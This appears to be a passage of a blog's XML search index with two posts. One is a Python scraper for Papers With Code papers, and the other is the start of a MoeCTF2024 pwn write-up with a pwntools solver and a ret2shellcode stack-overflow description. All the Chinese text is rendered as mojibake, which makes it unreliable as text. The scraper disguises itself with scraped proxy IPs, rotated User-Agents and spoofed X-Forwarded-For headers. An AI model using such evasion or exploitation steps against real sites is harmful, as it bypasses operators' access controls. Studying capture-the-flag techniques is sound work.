<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>åŸºäºrequeståº“å’Œreåº“çš„çˆ¬è™«å®æˆ˜</title>
      <link href="/2025/03/07/%E5%9F%BA%E4%BA%8Erequest%E5%BA%93%E5%92%8Cre%E5%BA%93%E7%9A%84%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%98/"/>
      <url>/2025/03/07/%E5%9F%BA%E4%BA%8Erequest%E5%BA%93%E5%92%8Cre%E5%BA%93%E7%9A%84%E7%88%AC%E8%99%AB%E5%AE%9E%E6%88%98/</url>
      
        <content type="html"><![CDATA[<p><strong>æŸä¸ªå®éªŒè¯¾çš„ä»»åŠ¡ï¼Œç›®æ ‡æ˜¯ä»è®ºæ–‡æ•°æ®åº“çˆ¬å–500ç¯‡è®ºæ–‡</strong></p><p><strong>çˆ¬å–ç½‘ç«™ï¼š<a href="https://paperswithcode.com/">The latest in Machine Learning | Papers With Code</a></strong></p><p><strong>å…³é”®å­—ï¼šLLM evaluation</strong></p><blockquote><p><em>è€å¸ˆç»™çš„æºä»£ç DrissionPageåº“ï¼Œå¾ˆèµå¾ˆå¥½ç”¨ï¼Œå°±æ˜¯å¤ªæ…¢äº†ã€‚</em></p><p><em>ä¸€æ—¶å…´èµ·æ‰“ç®—ç”¨requeståº“+reåº“è‡ªå·±æ“ä¸€ä¸ªçˆ¬è™«</em></p><p><em>æ­£åˆ™è™æˆ‘åƒç™¾éï¼Œæˆ‘å¾…æ­£åˆ™å¦‚åˆæ‹</em>ğŸ˜‹</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"><span class="comment">#éšæœºUAï¼Œè¿™æ˜¯æ¨¡æ‹Ÿç±»äººè¡Œä¸ºçš„ä¸€éƒ¨åˆ†</span></span><br><span class="line">USER_AGENTS = [</span><br><span class="line">        <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Opera/8.0 (Windows NT 5.1; U; en)&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.50&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.50&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; SE 2.X MetaSr 1.0)&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 UBrowser/4.0.3214.0 Safari/537.36&#x27;</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#å…ˆå»æ‰’å‡ ä¸ªå…è´¹ä»£ç†ip</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_iplist</span>():</span><br><span class="line">    url = <span class="string">&#x27;https://www.89ip.cn/&#x27;</span></span><br><span class="line">    html = requests.get(url).text</span><br><span class="line"></span><br><span class="line">    ip_list=[]</span><br><span class="line"></span><br><span class="line">    trs = re.findall(<span class="string">r&#x27;&lt;tr&gt;(.*?)&lt;/tr&gt;&#x27;</span>,html,re.S)</span><br><span class="line">    <span class="keyword">for</span> tr <span class="keyword">in</span> trs:</span><br><span class="line">        <span class="comment">#print(tr)</span></span><br><span class="line">        <span class="comment">#è·å–ipå’Œç«¯å£</span></span><br><span class="line">        td = re.findall(<span class="string">r&#x27;&lt;td&gt;.*?(\d+\.\d+\.\d+\.\d+|\d+).*?&lt;/td&gt;&#x27;</span>,tr,re.S)</span><br><span class="line">        <span class="keyword">if</span> td:</span><br><span class="line">            ip = <span class="string">f&quot;<span class="subst">&#123;td[<span class="number">0</span>]&#125;</span>:<span class="subst">&#123;td[<span class="number">1</span>]&#125;</span>&quot;</span></span><br><span class="line">            <span class="comment">#print(ip)</span></span><br><span class="line">            ip_list.append(ip)</span><br><span class="line">    <span class="keyword">return</span> ip_list</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Get_headers</span>(<span class="params">ip_list,USER_AGENTS</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment">#éšæœºé€‰å–ipå’ŒUA,ç±»äººç¾¤æ˜Ÿé—ªè€€</span></span><br><span class="line">    ip = random.choice(ip_list)</span><br><span class="line">    UA = random.choice(USER_AGENTS)</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;X-Forwarded-For&#x27;</span>:ip ,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>:UA </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> headers</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">work</span>():</span><br><span class="line"></span><br><span class="line">    ip_list = get_iplist()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    base_url = <span class="string">&#x27;https://paperswithcode.com&#x27;</span></span><br><span class="line">    init_url = <span class="string">&#x27;https://paperswithcode.com/search?q_meta=&amp;q_type=&amp;q=LLM+evaluation&#x27;</span></span><br><span class="line">    href_list = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">86</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;\033[93m[+]æ­£åœ¨çˆ¬å–ç¬¬<span class="subst">&#123;i&#125;</span>é¡µ\033[0m&#x27;</span>)</span><br><span class="line">        time.sleep(<span class="number">1.5</span>)</span><br><span class="line"></span><br><span class="line">        page_url = <span class="string">f&#x27;<span class="subst">&#123;init_url&#125;</span>&amp;page=<span class="subst">&#123;i&#125;</span>&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            headers = Get_headers(ip_list,USER_AGENTS)</span><br><span class="line">            text = requests.get(page_url,headers=headers).text</span><br><span class="line"></span><br><span class="line">            <span class="comment">#print(text)</span></span><br><span class="line">            divs = re.findall(<span class="string">r&#x27;&lt;div class=&quot;row infinite-item item paper-card&quot;&gt;(.*?)&lt;/div&gt;&#x27;</span>,text,re.S)</span><br><span class="line">            <span class="keyword">for</span> div <span class="keyword">in</span> divs:</span><br><span class="line">                <span class="comment">#print(div)</span></span><br><span class="line">                href = re.findall(<span class="string">r&#x27;&lt;a href=&quot;(.*?)&quot;&gt;&#x27;</span>,div,re.S)</span><br><span class="line">                <span class="comment">#print(href)</span></span><br><span class="line">                <span class="keyword">if</span> href:</span><br><span class="line">                    href_list.append(<span class="string">f&#x27;<span class="subst">&#123;base_url&#125;</span><span class="subst">&#123;href[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;\033[91m[-]ç¬¬<span class="subst">&#123;i&#125;</span>é¡µçˆ¬å–å¤±è´¥ï¼\033[0m&#x27;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#print(href_list)</span></span><br><span class="line">    <span class="built_in">sum</span> = <span class="built_in">len</span>(href_list)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;\033[95m[+]çˆ¬å–urlå®Œæˆï¼è·å¾—urlæ•°é‡ä¸º<span class="subst">&#123;<span class="built_in">sum</span>&#125;</span>ä¸ª\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    csv_headers = [<span class="string">&#x27;æ ‡é¢˜&#x27;</span>,<span class="string">&#x27;æ‘˜è¦&#x27;</span>,<span class="string">&#x27;æ–¹æ³•&#x27;</span>,<span class="string">&#x27;ä½œè€…&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;B:\\Desktop\\2025_Cource_assistant\\paperswitchcode_lib.csv&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8-sig&#x27;</span>,newline=<span class="string">&#x27;&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">        writer = csv.writer(f)</span><br><span class="line">        writer.writerow(csv_headers)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> href <span class="keyword">in</span> href_list:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;\033[93m[+]æ­£åœ¨å¤„ç†<span class="subst">&#123;href&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line">            <span class="built_in">sum</span>-=<span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;\033[95m[+]å‰©ä½™<span class="subst">&#123;<span class="built_in">sum</span>&#125;</span>ç¯‡è®ºæ–‡\033[0m&#x27;</span>)</span><br><span class="line">            time.sleep(<span class="number">1.5</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">                headers = Get_headers(ip_list,USER_AGENTS)</span><br><span class="line">                text = requests.get(href,headers=headers).text</span><br><span class="line"></span><br><span class="line">                res = []</span><br><span class="line">                <span class="comment">#è·å–è®ºæ–‡æ ‡é¢˜</span></span><br><span class="line">                title = re.findall(<span class="string">r&#x27;&lt;div class=&quot;paper-title&quot;&gt;.*?&lt;h1&gt;(.*?)&lt;/h1&gt;&#x27;</span>,text,re.S)[<span class="number">0</span>].strip()</span><br><span class="line">                <span class="comment">#print(title)</span></span><br><span class="line">                <span class="keyword">if</span> title:</span><br><span class="line">                    res.append(title)</span><br><span class="line">                <span class="keyword">else</span>:   </span><br><span class="line">                    res.append(<span class="string">&#x27;è·å–æ ‡é¢˜å¤±è´¥&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment">#è·å–è®ºæ–‡æ‘˜è¦</span></span><br><span class="line">                abstract = re.findall(<span class="string">r&#x27;&lt;div class=&quot;paper-abstract&quot;&gt;.*?&lt;p&gt;(.*?)&lt;/p&gt;&#x27;</span>,text,re.S)[<span class="number">0</span>].strip()</span><br><span class="line">                <span class="comment">#print(abstract)</span></span><br><span class="line">                <span class="keyword">if</span> abstract:</span><br><span class="line">                    res.append(abstract)</span><br><span class="line">                <span class="keyword">else</span>:   </span><br><span class="line">                    res.append(<span class="string">&#x27;è·å–æ‘˜è¦å¤±è´¥&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment">#è·å–Method</span></span><br><span class="line">                method_div = re.findall(<span class="string">r&#x27;&lt;div class=&quot;method-section&quot; id=&quot;methods&quot;&gt;(.*?)&lt;/div&gt;&#x27;</span>,text,re.S)[<span class="number">0</span>]</span><br><span class="line">                methods_raw = re.findall(<span class="string">r&#x27;&lt;a href=&quot;/method/.*?&gt;(.*?)&lt;/a&gt;&#x27;</span>,method_div,re.S)</span><br><span class="line">                methods = [re.sub(<span class="string">r&#x27;^\s+|\s+$&#x27;</span>, <span class="string">&#x27;&#x27;</span>, item) <span class="keyword">for</span> item <span class="keyword">in</span> methods_raw]</span><br><span class="line">                <span class="comment">#print(methods)</span></span><br><span class="line">                <span class="keyword">if</span> methods :</span><br><span class="line">                    res.append(<span class="string">&#x27;,&#x27;</span>.join(methods))</span><br><span class="line">                <span class="keyword">else</span>:   </span><br><span class="line">                    res.append(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment">#è·å–è®ºæ–‡ä½œè€…</span></span><br><span class="line">                authors = re.findall(<span class="string">r&#x27;&lt;span class=&quot;author-span&quot;&gt;.*?&lt;a href.*?&gt;(.*?)&lt;/a&gt;&#x27;</span>,text,re.S)</span><br><span class="line">                <span class="comment">#print(authors)</span></span><br><span class="line">                <span class="keyword">if</span> authors:</span><br><span class="line">                    res.append(<span class="string">&#x27;,&#x27;</span>.join(authors))</span><br><span class="line">                <span class="keyword">else</span>:   </span><br><span class="line">                    res.append(<span class="string">&#x27;è·å–ä½œè€…å¤±è´¥&#x27;</span>)</span><br><span class="line"></span><br><span class="line">                <span class="comment">#print(res)</span></span><br><span class="line">                <span class="keyword">if</span> res:</span><br><span class="line">                    writer.writerow(res)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&#x27;\033[91m[-]å¤„ç†<span class="subst">&#123;href&#125;</span>å¤±è´¥ï¼\033[0m&#x27;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    work()</span><br></pre></td></tr></table></figure><script src="https://cdn.jsdelivr.net/npm/echarts@4.8.0/dist/echarts.min.js"></script><script src="https://cdn.jsdelivr.net/npm/echarts-gl@1.1.1/dist/echarts-gl.min.js"></script><script>const data = {  name: 'flare',  children: [    {      name: 'data',      children: [        {          name: 'converters',          children: [            { name: 'Converters', value: 721 },            { name: 'DelimitedTextConverter', value: 4294 }          ]        },        {          name: 'DataUtil',          value: 3322        }      ]    },    {      name: 'display',      children: [        { name: 'DirtySprite', value: 8833 },        { name: 'LineSprite', value: 1732 },        { name: 'RectSprite', value: 3623 }      ]    },    {      name: 'flex',      children: [{ name: 'FlareVis', value: 4116 }]    },    {      name: 'query',      children: [        { name: 'AggregateExpression', value: 1616 },        { name: 'And', value: 1027 },        { name: 'Arithmetic', value: 3891 },        { name: 'Average', value: 891 },        { name: 'BinaryExpression', value: 2893 },        { name: 'Comparison', value: 5103 },        { name: 'CompositeExpression', value: 3677 },        { name: 'Count', value: 781 },        { name: 'DateUtil', value: 4141 },        { name: 'Distinct', value: 933 },        { name: 'Expression', value: 5130 },        { name: 'ExpressionIterator', value: 3617 },        { name: 'Fn', value: 3240 },        { name: 'If', value: 2732 },        { name: 'IsA', value: 2039 },        { name: 'Literal', value: 1214 },        { name: 'Match', value: 3748 },        { name: 'Maximum', value: 843 },        {          name: 'methods',          children: [            { name: 'add', value: 593 },            { name: 'and', value: 330 },            { name: 'average', value: 287 },            { name: 'count', value: 277 },            { name: 'distinct', value: 292 },            { name: 'div', value: 595 },            { name: 'eq', value: 594 },            { name: 'fn', value: 460 },            { name: 'gt', value: 603 },            { name: 'gte', value: 625 },            { name: 'iff', value: 748 },            { name: 'isa', value: 461 },            { name: 'lt', value: 597 },            { name: 'lte', value: 619 },            { name: 'max', value: 283 },            { name: 'min', value: 283 },            { name: 'mod', value: 591 },            { name: 'mul', value: 603 },            { name: 'neq', value: 599 },            { name: 'not', value: 386 },            { name: 'or', value: 323 },            { name: 'orderby', value: 307 },            { name: 'range', value: 772 },            { name: 'select', value: 296 },            { name: 'stddev', value: 363 },            { name: 'sub', value: 600 },            { name: 'sum', value: 280 },            { name: 'update', value: 307 },            { name: 'variance', value: 335 },            { name: 'where', value: 299 },            { name: 'xor', value: 354 },            { name: '_', value: 264 }          ]        },        { name: 'Minimum', value: 843 },        { name: 'Not', value: 1554 },        { name: 'Or', value: 970 },        { name: 'Query', value: 13896 },        { name: 'Range', value: 1594 },        { name: 'StringUtil', value: 4130 },        { name: 'Sum', value: 791 },        { name: 'Variable', value: 1124 },        { name: 'Variance', value: 1876 },        { name: 'Xor', value: 1101 }      ]    },    {      name: 'scale',      children: [        { name: 'IScaleMap', value: 2105 },        { name: 'LinearScale', value: 1316 },        { name: 'LogScale', value: 3151 },        { name: 'OrdinalScale', value: 3770 },        { name: 'QuantileScale', value: 2435 },        { name: 'QuantitativeScale', value: 4839 },        { name: 'RootScale', value: 1756 },        { name: 'Scale', value: 4268 },        { name: 'ScaleType', value: 1821 },        { name: 'TimeScale', value: 5833 }      ]    }  ]};var data2 = {  name: 'flare',  children: [    {      name: 'flex',      children: [{ name: 'FlareVis', value: 4116 }]    },    {      name: 'scale',      children: [        { name: 'IScaleMap', value: 2105 },        { name: 'LinearScale', value: 1316 },        { name: 'LogScale', value: 3151 },        { name: 'OrdinalScale', value: 3770 },        { name: 'QuantileScale', value: 2435 },        { name: 'QuantitativeScale', value: 4839 },        { name: 'RootScale', value: 1756 },        { name: 'Scale', value: 4268 },        { name: 'ScaleType', value: 1821 },        { name: 'TimeScale', value: 5833 }      ]    },    {      name: 'display',      children: [{ name: 'DirtySprite', value: 8833 }]    }  ]};</script><div id="echarts3424" style="width: 90%;height: 500px;margin: 0 auto"></div><script src="https://cdn.bootcss.com/echarts/3.8.0/echarts.common.min.js"></script><script type="text/javascript">        // åŸºäºå‡†å¤‡å¥½çš„domï¼Œåˆå§‹åŒ–echartså®ä¾‹        var myChart = echarts.init(document.getElementById('echarts3424'));        // æŒ‡å®šå›¾è¡¨çš„é…ç½®é¡¹å’Œæ•°æ®        var option = {    tooltip: {      trigger: 'item',      triggerOn: 'mousemove'    },    legend: {      top: '2%',      left: '3%',      orient: 'vertical',      data: [        {          name: 'tree1',          icon: 'rectangle'        },        {          name: 'tree2',          icon: 'rectangle'        }      ],      borderColor: '#c23531'    },    series: [      {        type: 'tree',        name: 'tree1',        data: [data],        top: '5%',        left: '7%',        bottom: '2%',        right: '60%',        symbolSize: 7,        label: {          position: 'left',          verticalAlign: 'middle',          align: 'right'        },        leaves: {          label: {            position: 'right',            verticalAlign: 'middle',            align: 'left'          }        },        emphasis: {          focus: 'descendant'        },        expandAndCollapse: true,        animationDuration: 550,        animationDurationUpdate: 750      },      {        type: 'tree',        name: 'tree2',        data: [data2],        top: '20%',        left: '60%',        bottom: '22%',        right: '18%',        symbolSize: 7,        label: {          position: 'left',          verticalAlign: 'middle',          align: 'right'        },        leaves: {          label: {            position: 'right',            verticalAlign: 'middle',            align: 'left'          }        },        expandAndCollapse: true,        emphasis: {          focus: 'descendant'        },        animationDuration: 550,        animationDurationUpdate: 750      }    ]  };        // ä½¿ç”¨åˆšæŒ‡å®šçš„é…ç½®é¡¹å’Œæ•°æ®æ˜¾ç¤ºå›¾è¡¨ã€‚        myChart.setOption(option);</script>]]></content>
      
      
      <categories>
          
          <category> å®éªŒ </category>
          
          <category> æ–‡ç«  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ‚é¡¹ </tag>
            
            <tag> çˆ¬è™« </tag>
            
            <tag> å®éªŒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MoeCTF2024-WP-Pwn</title>
      <link href="/2025/02/21/MoeCTF2024-WP-Pwn/"/>
      <url>/2025/02/21/MoeCTF2024-WP-Pwn/</url>
      
        <content type="html"><![CDATA[<p>è¥¿ç”µé“¾æ¥</p><p><a href="https://ctf.xidian.edu.cn/">è¥¿ç”µ CTF ç»ˆç«¯</a></p><h1 id="NotEnoughTime"><a href="#NotEnoughTime" class="headerlink" title="NotEnoughTime"></a>NotEnoughTime</h1><p>ä¸€ä¸ªç»ƒä¹ ä½¿ç”¨pwntoolsçš„é¢˜ç›®</p><p>ä¼šè¾“å‡ºè¡¨è¾¾å¼ï¼Œè€Œä¸”åå°æ¨¡æ‹Ÿäº†ç½‘ç»œå»¶è¿ŸçŠ¶å†µï¼Œéœ€è¦ä½¿ç”¨recvuntil</p><p>recvuntilæ˜¯æ¥æ”¶æ•°æ®ç›´åˆ°æŸä¸ªç‰¹ç‚¹ä¿¡æ¯ï¼Œæ³¨æ„è®¾ç½®æ—¶è¦ç”¨byteå½¢å¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span>         <span class="comment">#æ‰“å¼€debugå¯ä»¥éšæ—¶ç›‘æ§éƒ½æ”¶åˆ°äº†ä»€ä¹ˆå­—ç¬¦ï¼Œä»¥é˜²recvuntilå¡ä½æˆ–è€…é—æ¼å…³é”®ä¿¡æ¯</span></span><br><span class="line">io = remote(<span class="string">&#x27;192.168.43.76&#x27;</span>,<span class="number">2576</span>)</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">io.recvline()</span><br><span class="line"></span><br><span class="line"><span class="comment">#ä¸çŸ¥é“ä¸€å…±ä¼šæœ‰å¤šå°‘æ¡ï¼Œæ‰€ä»¥æš‚æ—¶å…ˆè®¾ç½®ä¸€ä¸ªå¾ªç¯æ•°</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>): </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;get:&quot;</span>)</span><br><span class="line">    line = io.recvuntil(<span class="string">b&#x27;=&#x27;</span>).decode()</span><br><span class="line">    <span class="keyword">if</span> line == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+]&#x27;</span>,line)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;=&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> line :   <span class="comment">#ä¸æ˜¯è¡¨è¾¾å¼</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        line = re.sub(<span class="string">&#x27;[a-zA-Z,!.]&#x27;</span>,<span class="string">&#x27;&#x27;</span>,line) <span class="comment">#æ¥æ”¶é€”ä¸­ä¼šå‡ºç°è¿›å…¥ä¸‹ä¸€é˜¶æ®µçš„æç¤ºï¼Œå°†å…¶åˆ é™¤ä»¥é˜²æ­¢å…¶æ··å…¥è¡¨è¾¾å¼</span></span><br><span class="line">        ans=<span class="built_in">eval</span>(line.replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;//&#x27;</span>))</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(ans).encode())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;done&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="ez-shellcode"><a href="#ez-shellcode" class="headerlink" title="ez_shellcode"></a>ez_shellcode</h2><p>çœ‹é¢˜ç›®å°±çŸ¥é“æ˜¯ret2shellcode</p><img src="/2025/02/21/MoeCTF2024-WP-Pwn/sh.png" class=""><p>éšæ„è¾“å…¥ä¸€ä¸ªæ•°å­—ï¼Œä¼šå¾—åˆ°nbyteçš„åœ°å€</p><p>è€Œä¸”readè¯­å¥å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´</p><p>åªéœ€è¦æŠŠshellcodeæ³¨å…¥åˆ°nbyteï¼Œç„¶åé€šè¿‡æ ˆæº¢å‡ºæŠŠè¿”å›åœ°å€ç¯¡æ”¹ä¸ºnbyteåœ°å€å³å¯</p><figure class="highlight 